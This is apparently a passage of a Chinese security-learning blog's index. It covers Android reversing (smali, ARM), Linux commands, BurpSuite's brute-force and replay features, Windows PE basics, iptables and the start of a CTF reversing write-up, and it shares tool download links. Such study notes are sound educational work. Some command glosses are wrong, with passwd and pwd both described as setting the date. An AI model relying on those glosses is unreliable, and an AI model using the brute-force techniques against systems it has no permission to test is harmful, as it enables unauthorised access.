Ljava/lang/StringBuilder;-&gt;toString()Ljava/lang/String; move-result-object v invoke-static &#123;v1, v2&#125;, Landroid/util/Log;-&gt;d(Ljava/lang/String;Ljava/lang/String;)I .line 17 add-int/lit8 v0, v0, 0x1 goto :goto_0 // 通过goto实现循环 .line 20 :cond_0 const/4 v1, 0x0 return v1.end methodfor/foreach循环，while/do-while 几种循环结构smali语法均通过goto实现，内部嵌入if-xxx 实现跳出循环。 try/catch语句12345678910111213141516171819202122# virtual methods.method public statementTry()Z .locals 4 .prologue .line 14 const-wide/16 v2, 0x3e8 :try_start_0 invoke-static &#123;v2, v3&#125;, Ljava/lang/Thread;-&gt;sleep(J)V :try_end_0 .catch Ljava/lang/InterruptedException; &#123;:try_start_0 .. :try_end_0&#125; :catch_0 .line 18 :goto_0 const/4 v1, 0x1 return v1 .line 15 :catch_0 move-exception v0 .line 16 .local v0, "e":Ljava/lang/InterruptedException; invoke-virtual &#123;v0&#125;, Ljava/lang/InterruptedException;-&gt;printStackTrace()V goto :goto_0.end method Android参考:http://blog.csdn.net/spy19881201/article/details/5775484samli参考:http://blog.csdn.net/chenrunhua/article/details/41250613https://www.cnblogs.com/zhen-android/p/7259434.html]]></content>
      <categories>
        <category>android</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Android_逆向]]></title>
    <url>%2F2018%2F03%2F08%2Fandroid_re_1%2F</url>
    <content type="text"><![CDATA[以前打比赛的时候就是我负责Android题目的，顺便上传一些工具，IDA7.0等 Android工具链接：https://pan.baidu.com/s/1poQEL-RlQgqRLhnfzozbpw 密码：n6bp 1、AndroidAndroid是基于liunx内核的，我们简单看一个hello world的执行过程 2、Android相关的语言Java:开发安卓SDK的软件smali:安卓的反汇编语言c/c++:开发安卓NDK的软件，也就是包括soPython:开发脚本插件，开发IDA脚本C#:Unity3d游戏开发Lua:重要的脚本插件或中间语言，在游戏中实用很多JS:开发用于和服务器协议算法相关 3、ARM汇编基础知识1、初识ARMIntel8086是英特尔公司的16位处理器，ARM是ARM公司的32位处理器。每个处理器都对应自己的一套汇编语言，所以两个处理器分别对应于8086汇编和ARM汇编。由于处理器的位数，所以8086汇编指令的机器码是16位，而ARM汇编指令的机器码就是32位。机器码可以看作是二进制指令，其实所谓的HEX即称为十六进制操作码或十六进制机器码，也是二进制指令，只是把二进制的数值用十六进制去展示。，如果你会了ARM，就会了主流的嵌入式开发，然后就是硬件编程，然后就是机器人或机械制造。所以,ARM真的非常重要，希望可以去认真学习，不仅是ARM指令集，还有ARM的机器码的原理，以及ELF文件在linux下的objdump反编译。ARM机器码32位，我们以跳转指令BEQ指令为例讲解汇编指令的机器码。 31-28位，Cond27-25位，101,B指令标识25-24位，Link23-0位，Offset,跳转处与当前指令差值 例：00001BD0 BRQ loc_1C04Cond:0000,表示EQ101,B系列指令固定标识L:0,表示不需要保存下一条指令Offset:该值位0x1C04-0x1BD0=0000 0000 0000 0000 0000 1011整体为：0000 1010 0000 0000 0000 0000 0000 1011 Cond B+Link Offset0A 00 00 0B再根据汇编倒序特点,显示为0B 00 00 0A 2、ARM与Thumb、Thunmb2指令当我们把SO里的汇编语言放到工具中去转换为HEX时，会发现和IDA中的HEX有时是完全不同的，这是因为IDA中有时反编译SO使用的不是ARM，而是16位的ARM，也就是Thumb指令，但有时却是ARM的32位指令。其实对于指令集的判断应该看机器码，当机器码第5位statebit值位1为Thumb指令集，当为0时位ARM指令集。Thunmb2指令为32位，只有当15-13位为111,12-11位不为00的情况下才是。如同beq,bne这两个汇编指令，用ARM的4个HEX表示时，其实HEX的值位0A,1A,而当用2个HEX数表示时，其HEX值为D0,D1。有时候动态调试的时候需要手工IDA转为Thumb指令 3、ARM的寄存器首先以标准ARM指令来看，有R0-R15个寄存器R0-R7:通用寄存器R8-R10:不通用寄存器R15:程序计数器(PC)，相当重要的一个寄存器，可以实现地址跳转，记的不是数，而是地址，直接关系着系统中断R13:堆栈指针(SP)R14:链接寄存器(LR)R11:基址指针(FP)R12:暂时寄存器(IP)CPSR:状态寄存器 4、ARM的指令CMP:比较CMP R0,#0 (R0寄存器中的值与0比较 标志位z=0,表示相等，在动态调试中可以看到) LDR: 从存储器中加载数据到寄存器 &lt;–LoadLDR R0,[R9,#04] 将R9+0x04指向存储单元的值赋给R0 STR: 将寄存器的数据存储到存储器 –&gt; StoreSTR R0,[R9,#04] R0的值存储到R9+0x04指向存储单元 LDM: 将寄存器的数据加载到一个寄存器列表LDM R0,{R1-R3} 将R0的数据依次加载到R1,R2,R3寄存器 SDM: 一个寄存器列表的数据存储到指定寄存器SDM R0,{R1-R3} PUSH: 将寄存器值压入堆栈中POP: 将堆栈中的数据推出到寄存器 ADD,SUB,MUL,DIV 加减乘除 AND,ORR,EOR 与，或，异或 LSL 逻辑左移LSR 逻辑右移 LSL R0,R1,#2 R0=R1*4 5、ARM寻址方式1). 寄存器： MOV R1,R2 ; R2-&gt;R12). 立即数： SUBS R0,R1,#1; R0=R1-13). 寄存器移位：MOV R0,R2,LSL #3 ;R2左移三位-&gt;R04). 间接寻址： LDR R1,[R2] ; 装载R2指向的内存数值至R15). 基址寻址： LDR R2,[R3,#0x0F] ;R3+0x0F作为地址，将所 6、函数传参一般从R0-R3,多于4个参数便会压入栈中 Liunx由于Android是基于liunx内核的 1、什么是LiunxLinux是一套免费使用和自由传播的类Unix操作系统，是一个基于POSIX和UNIX的多用户、多任务、支持多线程和多CPU的操作系统。它能运行主要的UNIX工具软件、应用程序和网络协议。它支持32位和64位硬件。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统，诞生于1991年10月5日。 2、Liunx的特点1、一切都是文件(就是系统中的所有都归结为一个文件，包括命令、硬件和软件设备、操作系统、进程等等对于操作系统内核而言，都被视为拥有各自特性或类型的文件)。2、Linux在内存管理优势：Windows是只在需要内存时，才为应用程序分配内存；Linux 无论物理内存有多大，都将其充份利用。3、不需要整理磁盘碎片4、每个软件都有确定的用途 3、Liunx文件1、文件系统1、普通文件:就是一般存取的文件，由ls -al显示出来的属性中，第一个属性为 [-]，例如 [-rwxrwxrwx]。2、目录文件（directory）:就是目录，第一个属性为 [d]，例如 [drwxrwxrwx]。3、连接文件（link）:类似Windows下面的快捷方式。第一个属性为 [l]，例如 [lrwxrwxrwx]。4、设备与设备文件（device）:系统外设及存储等相关的一些文件，通常都集中在 /dev目录。通常又分为两种：块设备文件：就是存储数据以供系统存取的接口设备，简单而言就是硬盘。例如一号硬盘的代码是 /dev/hda1等文件。第一个属性为 [b]。字符设备文件：即串行端口的接口设备，例如键盘、鼠标等等。第一个属性为 [c]5、套接字（sockets）：这类文件通常用在网络数据连接。可以启动一个程序来监听客户端的要求，客户端就可以通过套接字来进行数据通信。第一个属性为 [s]，最常在 /var/run目录中看到这种文件类型。6、管道（FIFO,pipe）：FIFO也是一种特殊的文件类型，它主要的目的是，解决多个程序同时存取一个文件所造成的错误。FIFO是first-in-first-out（先进先出）的缩写。第一个属性为 [p]。[ 2、文件结构/：根目录，所有的目录、文件、设备都在/之下，/就是Linux文件系统的组织者，也是最上级的领导者。根目录下一层一般有基础的15个目录:bin,boot,dev,etc,lib,media,mnt,opt,root,sbin,srv,tmp,usr,var/etc：etc这个目录是linux系统中最重要的目录之一。在这个目录下存放了系统管理时要用到的各种配置文件和子目录。要用到的网络配置文件，文件系统，x系统配置文件，设备配置信息，设置用户信息等都在这个目录下。/var：这个目录的内容是经常变动的，看名字就知道，可以理解为vary的缩写，/var下有/var/log 这是用来存放系统日志的目录。/var/ www目录是定义Apache服务器站点存放目录；/var/lib 用来存放一些库文件，比如MySQL的，以及MySQL数据库的的存放地。/mnt：这个目录一般是用于存放挂载储存设备的挂载目录的，比如有cdrom等目录。可以参看/etc/fstab的定义/usr/local：这里主要存放那些手动安装的软件，即不是通过“新立得”或apt-get安装的软件。它和/usr目录具有相类似的目录结构。让软件包管理器来管理/usr目录，而把自定义的脚本（scripts)放到/usr/local目录下面、。 3、文件操作cd-切换；pwd-显示当前目录；mkdir-新建一个新目录；rmdir-删除一个空目录；ls-查看文件目录；cp-复制文件；rm-删除文件；mv-移动文件 4、Liunx常用命令及技巧一。 通用命令: date ：print or set the system date and time 2. stty -a: 可以查看或者打印控制字符(Ctrl-C, Ctrl-D, Ctrl-Z等) 3. passwd: print or set the system date and time (用passwd -h查看) 4. logout, login: 登录shell的登录和注销命令 5. pwd: print or set the system date and time 6. more, less, head tail: 显示或部分显示文件内容. 7. lp/lpstat/cancel, lpr/lpq/lprm: 打印文件. 8. 更改文件权限： chmod u+x… 9. 删除非空目录：rm -fr dir 10.拷贝目录： cp -R dir 11. fg jobid :可以将一个后台进程放到前台。 Ctrl-z 可以将前台进程挂起(suspend), 然后可以用bg jobid 让其到后台运行。 job &amp; 可以直接让job直接在后台运行。 12. kill 的作用: send a signal to a process. eg: kill -9 发送的是SIG_KILL信号。。。 具体发送什么信号 可以通过 man kill 查看。 13. ps 的用法， ps -e 或 ps -o pid,ppid,session,tpgid, comm (其中session显示的sessionid, tpgid显示前台进程组id, comm显示命令名称。)二 .ubuntu常用命令: dpkg: package manager for Debian 安装： dpkg -i package 卸载： dpkg -r package 卸载并删除配置文件: dpkg -P |–purge package 如果安装一个包时。说依赖某些库。 可以先 apt-get install somelib… 查看软件包安装内容 :dpkg -L package 查看文件由哪个软件包提供: dpkg -S filename * 另外 dpkg还有 dselect和aptitude 两个frontend. apt 安装: apt-get install packs apt-get update : 更新源 apt-get upgrade: 升级系统。 apt-get dist-upgrade: 智能升级。安装新软件包,删除废弃的软件包 apt-get -f install ： -f == –fix broken 修复依赖 apt-get autoremove: 自动删除无用的软件 apt-get remove packages :删除软件 apt-get remove package –purge 删除包并清除配置文件 清除所以删除包的残余配置文件: dpkg -l |grep ^rc|awk ‘{print $2}’ |tr [“/n”] [“ “]|sudo xargs dpkg -P 安装软件时候包的临时存放目录 : /var/cache/apt/archives 清除该目录: apt-get clean 清除该目录的旧版本的软件缓存: apt-get autoclean 查询软件some的依赖包： apt-cache depends some 查询软件some被哪些包依赖: apt-get rdepends some 搜索软件: apt-cache search name|regexp 查看软件包的作用：apt-cache show package 查看一个软件的编译依赖库: apt-cache showsrc packagename|grep Build-Depends 下载软件的源代码 : apt-get source packagename (注: sources.list 中应该有 deb-src 源) 安装软件包源码的同时, 安装其编译环境 :apt-get build-dep packagename (有deb-src源) 如何将本地光盘加入安装源列表: apt-cdrom add 系统命令: 查看内核版本： uname -a 查看ubuntu 版本: cat /etc/issue 查看网卡状态 : ethtool eth0 查看内存,cpu的信息： cat /proc/meminfo ; cat /proc/cpuinfo (/proc下面的有很多系统信息) 打印文件系统空间使用情况: df -h 查看硬盘分区情况: fdisk -l 产看文件大小: du -h filename; 查看目录大小： du -hs dirname ; du -h dirname是查看目录下所有文件的大小 查看内存的使用： free -m|-g|-k 查看进程： ps -e 或ps -aux –&gt;显示用户 杀掉进程: kill pid 强制杀掉： killall -9 processname 网络相关： 配置 ADSL: sudo pppoeconf ADSL手工拨号: sudo pon dsl-provider 激活 ADSL : sudo /etc/ppp/pppoe_on_boot 断开 ADSL: sudo poff 根据IP查网卡地址: arping IP地址 产看本地网络信息（包括ip等）: ifconfig | ifconfig eth0 查看路由信息: netstat -r 关闭网卡： sudo ifconfig eth0 down 启用网卡： sudo ifconfig eth0 up 添加一个服务: sudo update-rc.d 服务名 defaults 99 删除一个服务: sudo update-rc.d 服务名 remove 临时重启一个服务: /etc/init.d/服务名 restart 临时关闭一个服务: /etc/init.d/服务名 stop 临时启动一个服务: /etc/init.d/服务名 start 控制台下显示中文: sudo apt-get install zhcon 查找某个文件: whereis filename 或 find 目录 -name 文件名 *通过ssh传输文件 scp -rp /path/filename username@remoteIP:/path #将本地文件拷贝到服务器上 scp -rp username@remoteIP:/path/filename /path #将远程文件从服务器下载到本地 压缩: 解压缩 a.tar.gz: tar zxvf a.tar.gz 解压缩 a.tar.bz2: tar jxvf a.tar.bz2 压缩aaa bbb目录为xxx.tar.gz: tar zcvf xxx.tar.gz aaa bbb 压缩aaa bbb目录为xxx.tar.bz2: tar jcvf xxx.tar.bz2 aaa bbb[6] Nautilus： 特殊 URI 地址 computer:/// - 全部挂载的设备和网络 network:/// - 浏览可用的网络 burn:/// - 一个刻录 CDs/DVDs 的数据虚拟目录 smb:/// - 可用的 windows/samba 网络资源 x-nautilus-desktop:/// - 桌面项目和图标 file:/// - 本地文件 trash:/// - 本地回收站目录 ftp:// - FTP 文件夹 ssh:// - SSH 文件夹 fonts:/// - 字体文件夹，可将字体文件拖到此处以完成安装 themes:/// - 系统主题文件夹 显示隐藏文件: Ctrl+h 显示地址栏: Ctrl+l 查看已安装字体: 在nautilus的地址栏里输入”fonts:///“，就可以查看本机所有的fonts[6]7.补充部分： 查看本地所有的tpc,udp监听端口: netstat -tupln (t=tcp, u=udp, p=program, l=listen, n=numric) 通过man搜说相关命令: man -k keyword . eg: man -k user 或者用 apropos 统计文件所占用的实际磁盘空间： du (du - estimate file space usage) 统计文件中的字符，字节数: wc -c/-l/-w (wc - print the number of newlines, words, and bytes in files) 查看文件的内容： od -x/-c/…. (od - dump files in octal and other formats) 我认为od最有用的就是文件的字节流了: od -t x1 filename 查看文件的 Ascii 码形式: od -t c filename (其中统计信息最左边的是： 字节数) 查找命令所在文件的位置： which od 输出： /usr/bin/od 查看该文件由哪个包提供： dpkg -S /usr/bin/od 输出: coreutils: /usr/bin/od 再查看coreutils包的全部内容就知道了linux的核心命令: dpkg -L coreutils 然后 info coreutils 哈哈，认真学吧， 满世界都是命令! 可以用man 命令产看某个命令的所有section 的解释: man -a tty 然后用q,和next 转换到下一个section的解释 bash 的好用的快捷键: ctrl+a:光标移到行首。 ctrl+b:光标左移一个字母 ctrl+c:杀死当前进程。 ctrl+d:退出当前 Shell。 ctrl+e:光标移到行尾。 ctrl+h:删除光标前一个字符，同 backspace 键相同。 ctrl+k:清除光标后至行尾的内容。 ctrl+l:清屏，相当于clear。 ctrl+r:搜索之前打过的命令。会有一个提示，根据你输入的关键字进行搜索bash的history ctrl+u: 清除光标前至行首间的所有内容。 ctrl+w: 移除光标前的一个单词 ctrl+t: 交换光标位置前的两个字符 ctrl+y: 粘贴或者恢复上次的删除 ctrl+d: 删除光标所在字母;注意和backspace以及ctrl+h的区别，这2个是删除光标前的字符 ctrl+f: 光标右移 ctrl+z : 把当前进程转到后台运行，使用’ fg ‘命令恢复。比如top -d1 然后ctrl+z ，到后台，然后fg,重新恢复 快速粘贴：先在一个地方选中文字，在欲粘贴的地方按鼠标 中键 即可。 等效中键：a 、按下滑轮等效于中键。b、同时按下鼠标 左右键，等效于中键。 快速重启X服务： 同时按下： Alt + Ctrl + Backspace 三个键。 打开”运行”窗口： 同时按下 Alt + F2 键。 戴屏： a、全屏：直接按下 PrtScr 键。 b、当前窗口：同时按下 Alt + PrtScr 键。 c、延时戴屏：在 终端 或 “运行”窗口中输入命令： gnome-screenshot –delay 3 ，将延时 3 秒后戴屏。 直接将 文件管理器 中的文件拖到 GNOME终端 中就可以在终端中得到完整的路径名。[6] 8.ulimit ulimit：显示（或设置）用户可以使用的资源的限制（limit），这限制分为软限制（当前限制）和硬限制（上限），其中硬限制是软限制的上限值，应用程序在运行过程中使用的系统资源不超过相应的软限制，任何的超越都导致进程的终止。 ulimited 不限制用户可以使用的资源，但本设置对可打开的最大文件数（max open files） 和可同时运行的最大进程数（max user processes）无效 -a 列出所有当前资源极限 -c 设置core文件的最大值.单位:blocks -d 设置一个进程的数据段的最大值.单位:kbytes -f Shell 创建文件的文件大小的最大值，单位：blocks -h 指定设置某个给定资源的硬极限。如果用户拥有 root 用户权限，可以增大硬极限。任何用户均可减少硬极限 -l 可以锁住的物理内存的最大值 -m 可以使用的常驻内存的最大值,单位：kbytes -n 每个进程可以同时打开的最大文件数 -p 设置管道的最大值，单位为block，1block=512bytes -s 指定堆栈的最大值：单位：kbytes -S 指定为给定的资源设置软极限。软极限可增大到硬极限的值。如果 -H 和 -S 标志均未指定，极限适用于以上二者 -t 指定每个进程所使用的秒数,单位：seconds -u 可以运行的最大并发进程数 -v Shell可使用的最大的虚拟内存，单位：kbytes eg: ulimit -c 1000(可以先通过ulimit -c 查看原来的值)]]></content>
      <categories>
        <category>android</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[BurpSuite从安装到"放弃"]]></title>
    <url>%2F2018%2F01%2F29%2Fweb_bp%2F</url>
    <content type="text"><![CDATA[以前也用过这个工具，不过没有好好的用，很多功能还不是很了解，现在嘛，发现它真的是个神器，好好的学习(其实为了以后找工作，毕竟以后还是会用到这个的呀)， 一、BurpSuite是啥如果你是打过ctf比赛的，那下面这段直接跳过。它由Java语言编写，是一个集成化的渗透测试工具，它集合了多种渗透测试组件，使我们自动化地或手工地能更好的完成对web应用的渗透测试和攻击。 常用的功能：抓包、重放、爆破二、安装BurpSuite(1)、首先你的电脑上有java环境，然后下载BurpSuite在命令控制端输入java,如果是这样，就有java环境，否则自己去安装吧。下载Bp链接：https://pan.baidu.com/s/10Jq0P5n67VdIZuNZLgj2SQ 密码：rc69 (2)、向浏览器中导入证书向bp中导入证书向浏览器中导入证书 (3)、运行，截断流量成功 三、功能介绍1、Proxy(代理)，提供一个直观、友好的用户界面，他的代理服务器包含非常详细的拦截规则，并能准确分析HTTP 消息的结构与内容选项Intercept选项option 2、Intruder(爆破)，定制攻击自动化抓包发送到Intruder处工具已经自动为我们创造了有效载荷测试的位置。有效载荷的位置使用§符号作为每个有针对性的攻击位置的起始和结束标记。你想测试的位置前后用§§符号进行标示。然后设置攻击类型Sniper 这种攻击模式可以让我们选择的攻击位置注入一个单一的有效载荷。Pitchfork 这种攻击模式允许你测试多种有效载荷，最大能够自定义8 个，基于攻击位置Cluster bomb 这种攻击模式使用多种有效载荷，并允许你测试每一个可能有效载荷在每个选择的攻击位置，这意味着接下来的测试，交换任何其他有效载荷。当你有不同需要注射的地方，它将会非常的方便。 3、Scanner Web 应用程序的安全漏洞进行自动发现工具。它被设计用于渗透测试，并密切与您现有的技术和方法，以适应执行手动和半自动化的Web 应用程序渗透测试。参考这个链接:https://bbs.ichunqiu.com/thread-16260-1-1.html 4、Repeater(重放)手工修改，可以不断重放，如下: 5、Decoder(解密)用于普通解密，hash]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[加密与解密]]></title>
    <url>%2F2017%2F12%2F30%2Fre_encode_and_decode_base%2F</url>
    <content type="text"><![CDATA[迟迟没有学习的加密与解密，现在开始吧 基础篇一、Win API简介API(Application Programming Interface)应用程序编程接口。在早期，windows的主要部分只需要三个动态链接库中实现，这代表了windows三个主要子系统——Kernel,User和GDI.Kernel:操作系统的核心功能服务，包括进程与线程控制，内存管理，文件访问等。User:负责处理用户接口，包括键盘和鼠标输入，窗口和菜单管理等。GDI:图形设备接口，允许程序在屏幕上和打印机上显示文本和图像。 二、常用的Win32 API函数1、GetWindowText函数此函数在USER32.DLL用户模块中，它的作用是取得一个窗体的标题文字，或者一个文本控件的内容。函数原型：12345int GetWindowText( HWND hwnd, //窗口或文本控件句柄 LPTSTR lpString, //缓冲区地址 int nMaxCount //复制的最大字符数) 返回值：如果成功就返回文本长度，失败就返回零。ANSI版是GetWindowTextA,Unicode版是GetWindowTextW. 2、GetDlgItem函数此函数在USER32.DLL用户模块中，它的作用是获取制定对话框的句柄。函数原型：1234HWND GetDlgItem( HWND hDlg, //对话框句柄 int nIDDlgItem //控件标识) 返回值：如果成功就返回对话框句柄，失败就返回零。 3、GetDlgItemText函数此函数在USER32.DLL用户模块中，它的作用是获取对话框的文本。函数原型：123456UINT GetDlgItemText( HWND hDlg, //对话框句柄 int nIDDlgItem, //控件标识(ID号) LPTSTR lpString, //缓冲区地址 int nMaxCount //复制的最大字符数) 返回值：如果成功就返回文本长度，失败就返回零。ANSI版是GetDlgItemTextA,Unicode版是GetDlgItemTextW. 4、GetDlgItemInt函数此函数在USER32.DLL用户模块中，它的作用是获取对话框的整数。函数原型：123456UINT GetDlgItemInt( HWND hDlg, //对话框句柄 int nIDDlgItem, //控件标识(ID号) BOOL *lpTranslated, //接收成功/失败指示的指针 BOOL bSigned //指定为有符号还是无符号) 返回值：如果成功就返回文本长度，失败就返回零。ANSI版是GetDlgItemIntA,Unicode版是GetDlgItemIntW. 5、MessageBox函数此函数在USER32.DLL用户模块中，创建和显示信息框函数原型：123456UINT MessageBox( HWND hWnd, //父窗口句柄 LPTSTR lpText, //消息框文本地址 LPTSTR lpCaption, //消息框标题地址 UINT uType //复制的最大字符数) 返回值：如果成功就返回文本长度，失败就返回零。ANSI版是MessageBoxA,Unicode版是MessageBoxW. 三、什么是句柄句柄(Handle)在Windows中使用非常频繁，它是Windows标识，由应用程序建立或使用的对象所使用的一个唯一的整数值(通常32位)。程序通过调用Windows函数获取句柄，然后在其他Window函数中使用这个句柄，以引用它代表的的对象。句柄的实际值对程序来说无关紧要。 四、Windows消息机制Windows是一个消息(Message)驱动式系统，Windows消息提供应用程序与应用程序，应用程序与Windows系统之间进行通信的手段。应用程序想要实现的 功能由消息来触发，并且靠对消息的响应和处理来完成。Windows系统中有两种消息列队:一种是系统消息列队，另一种是应用程序消息列队。计算机的所有输入设备由Windows监控。当一个事件发生时，Windwos先将输入的消息放入系统消息队列中，再将输入的消息拷贝到相应的程序队列中，应用程序中的消息循环从它的消息队列中检索每个消息并且发给相应的窗口函数中。总是按到达的先后排队(一些系统消息除外)，这就使得一些外部实时事件可能得不到及时的处理。 1、SendMessage函数调用一个窗口的窗口函数，将一条消息发给那个窗口。除非消息处理完毕，否则该函数不会返回。函数原型：123456LRESULT SendMessage( HWND hWnd, //目的窗口的句柄 UINT Msg, //消息标识符 WPARAM wParam, //消息的WPARAM域 LPARAM lParam //消息的LPARAM域) 返回值：由具体的消息决定，如消息投递成功，返回TURE(非零) 2、WM_COMMAND消息当用户从菜单或按钮中选择一条命令或者一个控件发给它的父窗口，或者当一个快捷键被释放时发送。函数原型：12345WM_COMMAND wNotifyCode = HIWORD(wParam);//通告代码 wID = LOWORD(wParam) //菜单条目，控件标识符 hwndCtl = (HWND) lParam, //控件句柄) 返回值：系统处理这条消息，返回零 五、虚拟内存虚拟内存(Virtual Memory)不是真正的内存,他通过映射(Map)的方法，使可使用的虚拟地址(Virtual Address)达到4GB。简单地说，虚拟内存的实现方法和过程如下: (1)当一个应用程序被启动时，操作系统就创建一个新进程，并给每个进程分配2GB的虚拟地址(不是内存，是地址)(2)虚拟内存管理器将应用程序的代码映射到那个程序代码的物理地址中的某个位置，并把当前所需要的代码读取到物理地址中(虚拟地址和应用程序代码在的物理内存中的位置是没有关系的)(3)如果使用动态链接库DLL,DLL也被映射到进程的虚拟地址的空间，在需要的时候才被读入物理内存(4)其它项目(例如数据，堆栈等)的空间是从物理内存中分配的，并被映射到虚拟空间中(5)应用程序通过使用它的虚拟地址空间中的地址开始执行，然后虚拟内存管理器每次把内存的内存访问映射到物理位置如果上面步骤不能理解，那明白以下几点就可以了：1、应用程序不会直接访问物理地址2、虚拟内存管理器通过虚拟地址的访问请求，控制所有的物理地址访问3、每个应用程序都有互相独立的4GB寻址空间，不同应用程序的地址空间是隔离的4、DLL程序没有自己”私有”空间，它们总是被映射打其它应用程序的地址空间。 使用虚拟内存的好处是：简化内存的管理，并可弥补物理内存的不足，可以防止多任务环境下各个应用程序之间的冲突。六、简单介绍PEWindows的可执行文件(EXE,DLL)是PE(Portable Executable)格式。PE文件使用的一个平面地址空间 ，所有的数据都被合并在一起，组成一个很大的结构。文件的内容被分割成不同的区块(Section,又称区段，节等)，块中包含代码和数据。每一个块都有他自己在内存中的一套属性(可读，可写等)。每一个区块都有不同的名字，这个名字表示区块代码的功能。常见的区块有.text,.rdata,.data,.rsrc等.text:是在编译或汇编结束时产生的一种块，它的内容全是指令代码.rdata:是运行期只读数据.data:是初始化的数据块.idata:包含其它外来DLL的函数技巧数据，即输入表。.rsrc:包含模块的全部资源，如图标，菜单，位图等。PE文件非常好的一个地方就是在磁盘上的数据与内存中的结构图是一致的。PE相关的名词解释如下:(1)入口点(Entry Point)PE文件执行时的入口点。也就是程序在执行时的第一行代码的地址应该是就这个值。(2)文件偏移地址(File Offset)当PE文件存储在磁盘上时，各数据的地址称做文件偏移地址 ，文件偏移地址从PE文件的第一个字节开始计数，起始值是0(3)虚拟地址(Virtual Address,VA)由于Windows程序运行在386保护模式下，所以程序访问存储器所使用的逻辑地址称为虚拟地址VA,又称为内存偏移地址。(4)基地址(ImageBase)文件执行时将被映射到指定的地址中，这个初始化内存地址称为基地址，这个值是由PE文件本身设定的。(5)相对虚拟地址(Relative Virual Address,RVA)表示此段代码在内存中相对于基地址的偏移,即：相对虚拟地址（RVA）=虚拟地址（VA）-基址（ImageBase）]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Liunx下的iptables]]></title>
    <url>%2F2017%2F12%2F19%2Flinux_kali_iptables%2F</url>
    <content type="text"><![CDATA[iptables是linux下的防火墙，得好好学习。 1、iptables是什么iptables是netfilter的基本框架，即liunx发行版下的防火墙，其实就是过滤数据包。举个栗子: 当Internet来了一个主机，想要进入主机。这时，会先经过iptables的规则，检查通过则接受(accept),否则，就会丢弃(drop)。iptables的规则是有顺序的，从开始配置，若是某一条匹配成功，则执行这条规则，后面的规则都不会执行。当所有的规则都不匹配，则丢弃(drop). 1、iptables的策略一般分为两种策略: “通”策略(定义只有指定ip能访问)和”堵”策略(所有的都能访问，但是有身份认证) 因为iptable有许多的规则，所有我们定义了许多的表(table),每个表的规则都不一样。比如filter,nat，mangle 数据包中允许或者不允许进入本机——filter(过滤器)地址转换的功能的则是——nat(地址转换)修改报文原数据的标志位——mangle(数据包修改QOS) 2、iptables常见的表每个表中有许多的规则链 filter(过滤器)——主要用于防火墙INPUT:处理输入数据包规则链OUTPUT:处理输出数据包规则链FORWARD:将来到本机的数据包转发到其它主机(这里与nat有关)的规则链 nat(地址转换)PREROUTING :地址转换前的规则POSTROUTING:地址转换后的规则OUTPUT: 与发送出去的数据包有关 mangle(修改数据包）mangle表的主要功能是根据规则修改数据包的一些标志位，以便其他规则或程序可以利用这种标志对数据包进行过滤或策略路由。 最常用的是filter表，我们的主要学习对象 3、iptables命令语法iptables (选项) (参数)12345678910111213141516-t&lt;表&gt;：指定要操纵的表； -A：向规则链中添加条目,添加到尾部； -D：从规则链中删除条目； -I：向规则链中插入条目,默认添加到首部； -R：替换规则链中的条目； -L：显示规则链中已有的条目； -F：清楚规则链中已有的条目； -Z：清空规则链中的数据包计算器和字节计数器； -N：创建新的用户自定义规则链； -P：定义规则链中的默认目标； -h：显示帮助信息； -p：指定要匹配的数据包协议类型； -s：指定要匹配的数据包源ip地址； -j&lt;目标&gt;：指定要跳转的目标； -i&lt;网络接口&gt;：指定数据包进入本机的网络接口； -o&lt;网络接口&gt;：指定数据包要离开本机所使用的网络接口。 iptables命令选项输入顺序：iptables -t 表名 &lt;-A/I/D/R&gt; 规则链名 [规则号] &lt;-i/o 网卡名&gt; -p 协议名 &lt;-s 源IP/源子网&gt; --sport 源端口 &lt;-d 目标IP/目标子网&gt; --dport 目标端口 -j 动作 一些动作1234567accept：接收数据包。 DROP：丢弃数据包。 REDIRECT：重定向、映射、透明代理。 SNAT：源地址转换。 DNAT：目标地址转换。 MASQUERADE：IP伪装（NAT），用于ADSL。 LOG：日志记录。 添加规则(如:屏蔽ip)123iptables -A INPUT -j DROP #屏蔽所有IP的命令 iptables -A INPUT -s 192.168.1.25 -j DROP #将这条命令添加到规则的尾部，屏蔽单个IP的命令 iptables -I INPUT -s 192.168.1.1/24 -j DROP #封整个段即从192.168.1.0到192.168.1.255的命令 删除规则12iptables -D INPUT -s 192.168.1.25 -j DROP #将这条命令从规则中删除iptables -D INPUT 2 #删除INPUT里面的第2条规则(从最上面开始) 限定某个ip登录ssh12iptables -A INPUT -p tcp --dport 22 -s 192.168.1.35 -j ACCEPT iptables -A INPUT -p tcp --dport 22 -j DROP 更改所有来自192.168.1.0/24的数据包的源ip地址为1.2.3.4(nat地址转化)iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o eth0 -j SNAT --to 1.2.3.4 查看的iptables规则iptables -nL --line-number]]></content>
      <categories>
        <category>liunx</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[悄悄的wp]]></title>
    <url>%2F2017%2F12%2F11%2Fwp_2017_12_11_zjgsctf_re_wp%2F</url>
    <content type="text"><![CDATA[这次比赛，有点坑逆向选手，再次感谢各位宽容大方善良美丽可爱小伙伴们。。。。 RERe1用peid查壳，发现是upx加壳，直接脱壳（ESP定律或者直接找脱壳工具），用IAD打开发现关键函数1234567891011121314151617181920212223__int64 main_0()&#123; int v0; // edx __int64 v1; // ST00_8 char Buffer; // [esp+D0h] [ebp-3Ch] puts("input your Secret:"); gets(&amp;Buffer); if ( sub_4110E6((int)&amp;unk_417680, &amp;Buffer) ) &#123; if ( sub_41102D(&amp;unk_417680) ) printf("flag is flag&#123;%s&#125;\n", &amp;Buffer); else printf("you can do it,again\n"); &#125; else &#123; printf("sorry\n"); &#125; HIDWORD(v1) = v0; LODWORD(v1) = 0; return v1;&#125; 发现sub_4110E6功能如下（简单xor），发现key12345678910int __cdecl sub_411520(int a1, char *Str)&#123; signed int i; // [esp+DCh] [ebp-8h] if ( j_strlen(Str) != 28 ) return 0; for ( i = 0; i &lt; 28; ++i ) *(_BYTE *)(i + a1) = LOBYTE(dword_417000[i]) ^ Str[i]; return 1;&#125; 发现sub_41102D函数，如果做过类似题的话，知道这是一个迷宫题目，因为发现正好是上下左右，并且一步都会判断是否出错，因为是+16，判断为宽16123456789101112131415161718192021222324252627282930signed int __cdecl 